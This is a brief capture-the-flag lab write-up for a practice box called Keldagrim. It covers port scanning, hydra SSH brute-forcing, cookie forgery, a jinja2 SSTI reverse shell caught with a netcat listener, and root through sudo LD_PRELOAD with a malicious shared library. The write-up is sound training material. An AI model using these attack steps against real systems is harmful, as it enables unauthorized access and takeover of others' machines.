## Keldagrim - Writeup

A lot of old star trek refs.!

### Port scan

`sudo nmap --top-ports 1000 -oN nmap_initial.txt IP_ADDRESS`
Found ports:
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
```

### Checked the web pages

- Found web app
- Two possible users: `jed` and `jad`
- Hydra time:
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f -o hydra_ssh.txt -u IP_ADDRESS -s 22 ssh
```
- Performed mannual enumeration. Found `/team` `/services` `/wow` and other game pages
- Used `gobuster` to find more directories and files `gobuster dir -u http://IP_ADDRESS:80 -w /usr/share/wordlists/rockyou.txt -o gobuster.txt`
  - Found `/admin`
  - Accessed the cURL request for `/admin` page
  - Found `Cookie: session=Z3Vlc3Q=` => base64 decoded to `guest`
  - Tried to change the cookie value to `admin` and checked the paage
  - Money now visible.
  - Cookie now is `Cookie: session=Z3Vlc3Q=; sales=JDIsMTY1` where sales is base64 encoded of the money value
  - SSTI vuln cookie found: `Cookie: session=<admin_base64_encoded>; sales=<sth>`. Here plugged in several payloads to check for SSTI impl used, found `jinja2`
  - Injected [rev-shell payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2), did base64 encode and got the shell using `nc -lvnp 4499`

### Foothold gained

- Found the user flag at `/home/jed/user.txt`
```
> whoami
jed
> cat /home/jed/user.txt
THM{some-gibberish}
# linpeas didn't work completely, but revealed [LD_PRELOAD](../LinuxTexhniques/LD_PRELOAD.md) as a possible escalation method
> sudo -l
# found that `jed` can run `/bin/ps` with `LD_PRELOAD` env variable
# exec the shared lib injection attack for `/bin/ps` and got root shell
> sudo LD_PRELOAD=./evil.so /bin/ps
> whoami
root
> cat /root/root.txt
THM{some-gibberish}
```

We done!